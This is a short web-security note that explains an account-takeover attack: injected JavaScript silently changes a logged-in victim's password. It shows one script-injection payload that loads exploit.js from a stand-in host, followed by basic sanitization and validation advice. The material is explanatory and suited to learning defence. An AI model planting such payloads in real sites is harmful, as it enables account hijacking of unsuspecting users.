A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the JavaScript CSRF payload), the JavaScript code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

```
"><script src=//www.example.com/exploit.js></script>
```
- load script that changes password (must know APIs and password changing procedure)

## Prevention
- Sanitization: 	Removing special characters and non-standard characters from user input before displaying it or storing it.
- Validation: 	Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)
